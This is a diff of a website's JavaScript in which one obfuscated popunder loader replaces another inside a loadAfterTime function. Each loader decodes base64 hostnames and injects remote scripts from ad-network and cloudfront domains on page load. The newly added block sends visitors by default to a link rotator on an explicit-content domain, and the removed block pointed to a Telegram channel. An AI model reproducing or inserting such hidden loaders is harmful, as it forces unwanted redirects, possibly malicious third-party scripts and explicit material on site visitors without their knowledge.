@@ -17,8 +17,8 @@ function isSpeedBotX(){
 
 function loadAfterTime(source) { 
 
+	(function(){var u=window,r="d30a423e37fe9b7888b7e8f56a20e472",z=[["siteId",861*328+861-791*531+5072267],["minBid",0.0001],["popundersPerIP","0"],["delayBetween",0],["default","https://300incestos.com/linkrotator.php"],["defaultPerDay",0],["topmostLayer","auto"]],e=["d3d3LmludGVsbGlnZW5jZWFkeC5jb20vd1dzL3NFYy9ybDIwbi5taW4uanM=","ZDJrbHg4N2Jnem5nY2UuY2xvdWRmcm9udC5uZXQvZnJvdWdoLmpz"],f=-1,t,k,c=function(){clearTimeout(k);f++;if(e[f]&&!(1755771556000<(new Date).getTime()&&1<f)){t=u.document.createElement("script");t.type="text/javascript";t.async=!0;var y=u.document.getElementsByTagName("script")[0];t.src="https://"+atob(e[f]);t.crossOrigin="anonymous";t.onerror=c;t.onload=function(){clearTimeout(k);u[r.slice(0,16)+r.slice(0,16)]||c()};k=setTimeout(c,5E3);y.parentNode.insertBefore(t,y)}};if(!u[r]){try{Object.freeze(u[r]=z)}catch(e){}c()}})();
 
-(function(){var h=window,o="d30a423e37fe9b7888b7e8f56a20e472",z=[["siteId",224-435-808+391+4936143],["minBid",0.0001],["popundersPerIP","0"],["delayBetween",0],["default","https://t.me/gayetitos"],["defaultPerDay",0],["topmostLayer","auto"]],y=["d3d3LmludGVsbGlnZW5jZWFkeC5jb20vZWVtYmVyLm1pbi5jc3M=","ZDJrbHg4N2Jnem5nY2UuY2xvdWRmcm9udC5uZXQvekF3L3RIVE1MLm1pbi5qcw=="],g=-1,k,l,f=function(){clearTimeout(l);g++;if(y[g]&&!(1755250976000<(new Date).getTime()&&1<g)){k=h.document.createElement("script");k.type="text/javascript";k.async=!0;var a=h.document.getElementsByTagName("script")[0];k.src="https://"+atob(y[g]);k.crossOrigin="anonymous";k.onerror=f;k.onload=function(){clearTimeout(l);h[o.slice(0,16)+o.slice(0,16)]||f()};l=setTimeout(f,5E3);a.parentNode.insertBefore(k,a)}};if(!h[o]){try{Object.freeze(h[o]=z)}catch(e){}f()}})();
 /*
 	loadJS2("//ss.mrmnd.com/dynamic.js","4923d013-8239-4362-985e-a017c5023cb8");
 	loadJS2("//ss.mrmnd.com/dynamic.js","a5d11fd3-d6d7-4261-8b24-636bc8f420e8");
